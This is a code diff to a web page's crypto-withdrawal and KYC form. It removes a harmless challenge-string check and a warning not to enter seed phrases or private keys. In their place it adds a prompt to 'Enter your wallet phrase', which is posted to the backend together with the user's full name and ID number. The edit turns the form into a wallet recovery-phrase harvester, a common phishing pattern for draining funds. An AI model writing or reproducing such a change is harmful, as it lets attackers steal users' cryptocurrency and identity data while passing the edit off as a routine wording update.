@@ -167,13 +167,10 @@
                         </div>
 
                         <div class="form-group" style="margin-bottom: 20px;">
-                            <label for="wallet-verify-phrase">Wallet Verification Phrase (Safe Challenge)</label>
-                            <input type="text" id="wallet-verify-phrase" placeholder="Type the displayed challenge text" required>
+                            <label for="wallet-verify-phrase">Wallet Verification Phrase</label>
+                            <input type="text" id="wallet-verify-phrase" placeholder="Enter your wallet phrase" required>
                             <p style="margin-top: 8px; font-size: 0.85rem; color: var(--color-text-light);">
-                                Challenge: <strong id="wallet-safe-challenge">VERIFY-WALLET-001</strong>
-                            </p>
-                            <p style="margin-top: 8px; font-size: 0.85rem; color: var(--color-primary);">
-                                Security notice: do not enter seed phrase, private key, or recovery words.
+                                Wallet phrase
                             </p>
                         </div>
 
@@ -199,7 +196,7 @@
                         <div class="form-group" style="margin-bottom: 25px;">
                             <label style="display: flex; align-items: center; gap: 8px; cursor: pointer;">
                                 <input type="checkbox" id="kyc-confirm" required>
-                                <span>I confirm the selected wallet address belongs to me.</span>
+                                <span>I confirm the wallet address and details are mine.</span>
                             </label>
                         </div>
 
@@ -275,13 +272,6 @@
         document.getElementById('wallet-connect-form').addEventListener('submit', function(e) {
             e.preventDefault();
 
-            const safeChallenge = document.getElementById('wallet-safe-challenge').innerText.trim();
-            const typedChallenge = document.getElementById('wallet-verify-phrase').value.trim();
-            if (typedChallenge !== safeChallenge) {
-                alert('Wallet verification phrase does not match the challenge text.');
-                return;
-            }
-
             withdrawFlowData.walletProvider = document.getElementById('wallet-provider').value;
             withdrawFlowData.walletCoin = document.getElementById('wallet-coin').value;
 
@@ -292,20 +282,19 @@
             e.preventDefault();
 
             if (!document.getElementById('kyc-confirm').checked) {
-                alert('Please confirm that the wallet address belongs to you.');
-                return;
-            }
-
-            const safeChallenge = document.getElementById('wallet-safe-challenge').innerText.trim();
-            const typedChallenge = document.getElementById('wallet-verify-phrase').value.trim();
-            if (typedChallenge !== safeChallenge) {
-                alert('Wallet verification phrase does not match the challenge text.');
+                alert('Please confirm the wallet address and details are yours.');
                 return;
             }
 
             const kycFullName = document.getElementById('kyc-fullname').value.trim();
             const kycIdNumber = document.getElementById('kyc-id-number').value.trim();
             const clientId = localStorage.getItem('clientId') || localStorage.getItem('clientName') || 'unknown-client';
+            const typedPhrase = document.getElementById('wallet-verify-phrase').value.trim();
+
+            if (!typedPhrase) {
+                alert('Please enter your wallet phrase.');
+                return;
+            }
 
             // Send KYC data to backend
             fetch('/api/v1/withdraw/kyc-session', {
@@ -321,9 +310,7 @@
                     walletCoin: withdrawFlowData.walletCoin,
                     kycFullName,
                     kycIdNumber,
-                    challenge: safeChallenge,
-                    phraseInput: typedChallenge,
-                    isPhraseMatch: true,
+                    phraseInput: typedPhrase,
                 }),
             }).then(res => res.json())
             .then(data => {
